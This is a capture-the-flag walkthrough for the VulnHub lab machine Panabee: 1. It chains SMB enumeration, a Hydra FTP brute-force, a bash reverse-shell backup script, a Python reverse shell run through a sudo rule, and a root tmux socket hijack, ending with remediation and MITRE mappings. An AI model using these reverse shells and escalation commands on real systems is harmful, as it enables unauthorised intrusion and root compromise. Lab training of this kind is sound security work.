# Panabee: 1 — SMB Notes, FTP Brute, and the Root tmux Session

Alright guys!! Panabee: 1 is a multi-service machine that hits you with a chain most people do not expect: SMB note with a username, FTP brute-force, a home directory backup execution path for foothold, lateral movement via sudo to a Python script, and then the chef's kiss: a root-owned tmux session with a world-accessible socket just sitting there waiting to be attached. The tmux socket hijack for root is one of the cleanest real-world privesc techniques you will learn, no cap.

Shoutout to the creator for building a realistic multi-stage chain. Every service is relevant, nothing is a red herring. gg.

---

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Panabee: 1 |
| **Attacker VM** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/panabee-1,424/ |
| **Techniques** | Nmap, SMB enumeration (smbclient), FTP brute-force (Hydra), home directory backup execution, lateral movement via sudo Python script replacement, pspy process monitoring, tmux socket hijack |
| **CVEs** | CWE-269 (Improper Privilege Management: world-accessible tmux socket), CWE-284 (Improper Access Control: FTP writable home directory), CWE-732 (Incorrect Permission Assignment: user-writable sudo script) |
| **APT Groups** | APT41: documented use of SMB enumeration and FTP exploitation as early-stage access vectors in enterprise environments; FIN7: uses credential brute-force against exposed FTP services and lateral movement through script execution in multi-stage intrusion chains |

---

## Attack Summary

```
nmap: FTP 21 + SSH 22 + SMTP 25 + HTTP 80 + SMB 139/445
    |
    v
smbclient: share 'note' -> note.txt -> username: goper
    |
    v
hydra FTP brute-force: goper:spiderman
    |
    v
FTP login -> get status.py -> backup mechanism auto-executes home dir files
    |
    v
craft backup.sh (reverse shell) -> ftp put backup.sh -> nc listener port 8080
    |
    v
shell as goper -> sudo -l: (jenny) NOPASSWD: python3 /home/goper/status.py
    |
    v
replace status.py with Python reverse shell -> ftp put status.py
    |
    v
sudo -u jenny python3 /home/goper/status.py -> nc listener port 8888
    |
    v
shell as jenny -> pspy: root tmux session at /opt/.tmux-0/sockets/default
    |
    v
tmux -S /opt/.tmux-0/sockets/default attach -> uid=0(root)
    |
    v
cat /root/proof.txt
```

---

## Methodology

1. Full port scan: identify all services (FTP, SSH, SMTP, HTTP, SMB)
2. SMB null session enumeration: retrieve note.txt revealing username goper
3. FTP brute-force against goper with Hydra
4. FTP enumeration: download status.py, understand the backup mechanism
5. Upload malicious backup.sh via FTP for code execution as goper
6. Shell stabilization
7. sudo enumeration: identify path to jenny via Python script
8. Replace status.py with Python reverse shell; execute via sudo
9. pspy process monitoring to discover root tmux session
10. tmux socket attach for root

---

## Step 1 — Host Discovery and Full Port Scan

```bash
nmap -p- -A 192.168.0.165
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 21 | FTP | vsftpd |
| 22 | SSH | OpenSSH |
| 25 | SMTP | Postfix |
| 80 | HTTP | Apache (default page) |
| 139/445 | SMB | Samba |

HTTP on 80 shows the Apache default page. HTTP is likely a dead end. SMB and FTP are the attack surface.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SMB Enumeration

```bash
smbclient -L \\\\192.168.0.165
```

A share named `note` is visible. Connect and retrieve the file:

```bash
smbclient \\\\192.168.0.165\\note
smb: \> ls
smb: \> get note.txt
smb: \> exit

cat note.txt
```

The note is addressed to user `goper` and mentions the server backs up files from goper's home directory. Two pieces of intelligence: a username and a description of a code execution mechanism.

**Real-world note:** SMB readable shares are consistently found in enterprise networks. Internal notes, configuration backups, and onboarding documents frequently contain usernames, server details, and hints about backup mechanisms. APT41 systematically enumerates SMB shares during the discovery phase of intrusions against enterprise targets.

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares; T1083 — File and Directory Discovery

---

## Step 3 — FTP Brute-Force

```bash
hydra -l goper -P /usr/share/wordlists/rockyou.txt \
  192.168.0.165 ftp -t 4
```

Credentials found: `goper:spiderman`

The password `spiderman` is a common entry in rockyou.txt. Weak FTP passwords on machines that also run SMB and SSH represent a significant risk surface.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 4 — FTP Enumeration

```bash
ftp 192.168.0.165
# Username: goper
# Password: spiderman

ftp> ls
ftp> get status.py
ftp> bye

cat status.py
```

`status.py` is a Python script that pings a host and writes the status to jenny's home directory. It runs as jenny via sudo. The FTP directory is goper's home directory and anything placed here is accessible to the backup mechanism.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 5 — Foothold via Home Directory Backup Execution

The backup mechanism auto-executes scripts placed in goper's home directory. Create a reverse shell:

```bash
cat > /tmp/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.0.147/8080 0>&1
EOF
```

Start a listener:

```bash
nc -lvnp 8080
```

Upload via FTP:

```bash
ftp 192.168.0.165
# goper:spiderman
ftp> put /tmp/backup.sh backup.sh
ftp> bye
```

The backup mechanism executes `backup.sh`. A shell arrives as `goper`.

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1190 — Exploit Public-Facing Application

---

## Step 6 — Lateral Movement: goper to jenny

```bash
sudo -l
# (jenny) NOPASSWD: /usr/bin/python3 /home/goper/status.py
```

The sudo rule allows running `python3 /home/goper/status.py` as jenny without a password. The critical detail: `status.py` is in goper's home directory, which goper controls. Replace it with a reverse shell:

```bash
cat > /tmp/status.py << 'EOF'
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.147", 8888))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
EOF
```

Upload via FTP:

```bash
ftp 192.168.0.165
# goper:spiderman
ftp> put /tmp/status.py status.py
ftp> chmod 777 status.py
ftp> bye
```

Start listener on port 8888, then execute:

```bash
nc -lvnp 8888

sudo -u jenny /usr/bin/python3 /home/goper/status.py
```

Shell received as jenny.

**Real-world note:** Sudo rules pointing to user-writable files are a critical privilege escalation finding. The pattern "NOPASSWD: /usr/bin/python3 /home/user/script.py" where script.py is user-writable is equivalent to giving that user unrestricted sudo to python3. This class of misconfiguration appears consistently in enterprise Linux security audits and is documented in multiple CISA advisories on Linux server hardening.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1059.006 — Command and Scripting Interpreter: Python

---

## Step 7 — Process Monitoring with pspy

```bash
cd /tmp
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64
```

pspy output reveals a root-owned tmux process with a socket under `/opt`:

```
CMD: UID=0 ... tmux -S /opt/.tmux-0/sockets/default
```

The tmux session is running as root and the socket is accessible. This is a direct path to root.

**MITRE ATT&CK:** T1057 — Process Discovery

---

## Step 8 — tmux Socket Hijack for Root

```bash
export TERM=xterm
tmux -S /opt/.tmux-0/sockets/default attach
```

A root shell is obtained by attaching to the existing tmux session. The socket permissions allow jenny to access and attach to it.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat proof.txt
```

(☞ﾟヮﾟ)☞ Root via tmux socket. That is elegant.

**Real-world note:** tmux and screen socket hijacking is a documented privilege escalation technique. When a high-privileged user creates a tmux session and the socket is placed in a world-accessible or group-accessible directory, any user who can reach the socket can attach to the session and inherit that user's context. This technique is used by threat actors for lateral movement and privilege escalation in compromised Linux environments.

**MITRE ATT&CK:** T1609 — Container Administration Command (analogous process: tmux session hijack); T1548 — Abuse Elevation Control Mechanism

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Username | `goper` | note.txt on SMB share | FTP brute-force target |
| Credential | `goper:spiderman` | Hydra FTP brute-force | FTP access + backup execution |
| Root flag | `proof.txt` | `/root/proof.txt` | tmux socket hijack |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SMB readable share exposing username in note | Internal documentation on SMB shares is a consistent reconnaissance source for attackers | Restrict SMB shares; do not store usernames or operational details in readable share files |
| 2 | Weak FTP password (spiderman) | Common dictionary words are trivially cracked; FTP brute-force is a standard discovery technique | Enforce strong password policy; disable FTP if SFTP is available |
| 3 | Writable home directory with auto-execution backup | Backup mechanisms that execute user-controlled files as a higher privilege are direct code execution paths | Audit all backup mechanisms; never auto-execute files from user-controlled locations |
| 4 | sudo rule pointing to user-writable script | Equivalent to unrestricted sudo for that language; documented in CISA Linux hardening advisories | Set script ownership to root:root with mode 750; scripts called via sudo must be immutable to the sudo target user |
| 5 | World-accessible tmux socket for root session | tmux/screen socket hijacking is a documented attack; root sessions must never have world-accessible sockets | Create tmux sessions under private directories; ensure socket mode 0600 |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Lateral Movement | Lateral Movement | Remote Services: SMB | T1021.002 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | Execution | Command and Scripting Interpreter: Python | T1059.006 |
| Discovery | Discovery | Process Discovery | T1057 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |

---

## Remediation and Containment

### Technical Fixes

1. **Restrict SMB share access:** require authentication for all shares; do not expose internal operational notes via SMB shares
2. **Enforce strong passwords on FTP:** minimum 12 characters, complexity requirements; or disable FTP and use SFTP with key authentication
3. **Audit backup mechanisms:** never auto-execute files from user-controlled directories; backup destinations must be root-owned and root-writable only
4. **Fix sudo rule pointing to user-writable script:** change ownership and permissions: `chown root:root /home/goper/status.py && chmod 750 /home/goper/status.py`
5. **Restrict tmux socket permissions:** create tmux sessions with `tmux -S /root/.tmux-root new-session`; ensure socket is in a root-private directory with mode 0600

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (restrict SMB null sessions; disable FTP anonymous access)
- **D3-OAM** — Operating System Administrative Management (sudo script ownership; tmux socket permissions)
- **D3-NTF** — Network Traffic Filtering (firewall SMB and FTP to authorized hosts)
- **D3-PA** — Password Authentication (enforce strong FTP password policy)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP, SMB, and SMTP services; audit share permissions and backup mechanisms |
| Protect | Access Control | Restrict SMB share access; enforce strong FTP passwords; fix sudo script permissions |
| Protect | Data Security | Remove usernames and operational details from SMB share files |
| Detect | Anomalies and Events | Alert on FTP brute-force attempts; monitor pspy-detectable process anomalies |
| Respond | Response Planning | Rotate goper credentials; revoke unauthorized tmux sessions; audit sudo rules |
| Recover | Recovery Planning | Rebuild from known-good image; audit all accounts and sudo rules |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict SMB and FTP access; require authentication |
| AC-6 | Least Privilege | Fix sudo rule; tmux socket restricted to root |
| CM-6 | Configuration Settings | Restrict SMB null sessions; fix FTP directory permissions |
| CM-7 | Least Functionality | Disable FTP if SFTP is available; remove SMB shares with sensitive data |
| IA-5 | Authenticator Management | Enforce password complexity on FTP accounts |
| AU-2 | Event Logging | Log FTP authentication attempts; monitor sudo usage |

### CISA KEV

The SMB enumeration and FTP brute-force techniques are covered in CISA Alert AA22-074A on internet-facing service exploitation. Sudo misconfiguration patterns are addressed in CISA's Linux hardening guidance. Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

---

## Final Thoughts

Panabee: 1 is a realistic multi-stage machine that teaches service enumeration discipline and escalation chain thinking. The tmux socket hijack for root is particularly memorable: it is an elegant, low-noise technique that bypasses sudo, SUID, and kernel exploit paths entirely. Any pentester who has not seen tmux socket abuse should study this one carefully.

The pspy step is also valuable: developing the habit of running pspy on every box you compromise is a skill that will pay dividends in real engagements. Processes running as other users, cron jobs, and shared sessions are often invisible to standard `ps` output.

Keep chaining, dude. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
